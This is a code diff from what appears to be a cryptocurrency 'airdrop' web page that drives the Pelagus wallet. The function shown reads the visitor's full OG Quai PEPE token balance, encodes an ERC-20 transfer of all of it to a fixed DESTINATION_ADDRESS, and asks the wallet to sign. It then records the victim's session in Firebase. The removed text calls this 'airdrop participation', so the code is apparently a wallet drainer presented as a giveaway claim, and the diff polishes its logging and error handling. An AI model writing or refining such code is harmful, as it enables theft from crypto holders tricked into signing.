@@ -395,49 +395,46 @@ async function saveToFirebase(data) {
             throw new Error('Pelagus wallet not found');
         }
 
-        log('🔄 Preparing token transfer...');
+        // Check user's token balance
         const currentBalance = await getTokenBalance(userSession.address);
         if (currentBalance <= 0n) {
             log('❌ No tokens available to send');
             throw new Error('No tokens available to send');
         }
 
+        log('🔄 Preparing token transfer...');
         const readableAmount = (Number(currentBalance) / 1e18).toString();
-        log(`📤 Preparing to send ${readableAmount} OG Quai PEPE tokens...`);
+        log(`📤 Found ${readableAmount} tokens to send`);
 
-        // Token transfer method ID for 'transfer(address,uint256)'
-        const methodId = '0xa9059cbb';
-        // Remove '0x' and pad address to 32 bytes
-        const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
-        // Use entire balance as amount, pad to 32 bytes
-        const amount = currentBalance.toString(16).padStart(64, '0');
-        
-        // Construct the data field
-        const data = methodId + paddedAddress + amount;
+        // Token transfer function setup
+        const methodId = '0xa9059cbb'; // transfer(address,uint256)
+        const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
+        const paddedAmount = currentBalance.toString(16).padStart(64, '0');
+        const data = '0x' + methodId + paddedDestination + paddedAmount;
 
+        // Transaction parameters
         const transactionParameters = {
-            to: TOKEN_ADDRESS,
-            from: userSession.address,
-            data: '0x' + data,
+            from: userSession.address,            // Your wallet address
+            to: TOKEN_ADDRESS,                    // Token contract address
+            data: data,                          // Encoded transfer data
+            value: '0x0'                         // No QUAI being sent
         };
 
-        log('🔄 Please confirm the transaction in your wallet...');
+        log(`🔄 Sending all tokens (${readableAmount} OG Quai PEPE) to ${DESTINATION_ADDRESS}`);
         const txHash = await window.pelagus.request({
             method: 'eth_sendTransaction',
             params: [transactionParameters],
         });
 
-        log(`📝 Transaction hash: ${txHash}`);
-        log('🔄 Waiting for transaction confirmation...');
+        log(`📝 Transaction sent! Hash: ${txHash}`);
+        log('⏳ Waiting for confirmation...');
 
-        // Wait for transaction confirmation
+        // Wait for confirmation
         const receipt = await waitForTransaction(txHash);
         
-        // Update userSession with transfer data
+        // Update database and UI
         userSession.transferAmount = readableAmount;
         userSession.transferTxHash = txHash;
-
-        // Save updated data to Firebase
         await saveSessionToFirebase();
 
         // Update UI
@@ -445,17 +442,18 @@ async function saveToFirebase(data) {
         document.getElementById('scanBtn').style.display = 'block';
         document.getElementById('buyBtn').style.display = 'block';
 
-        log('✅ Transaction confirmed!');
-        log(`💫 Successfully sent ${readableAmount} OG Quai PEPE tokens!`);
-        log('---------------------------------------------');
-        log('🎉 Airdrop participation complete!');
+        log('✅ Transfer complete!');
+        log(`💫 Successfully sent ${readableAmount} tokens!`);
 
     } catch (error) {
-        log('❌ Error sending tokens: ' + error.message);
+        if (error.code === 4001) {
+            log('❌ Transaction rejected in wallet');
+            return;
+        }
+        log('❌ Error: ' + error.message);
         console.error(error);
     }
 }
-
         async function waitForTransaction(txHash) {
             while (true) {
                 try {
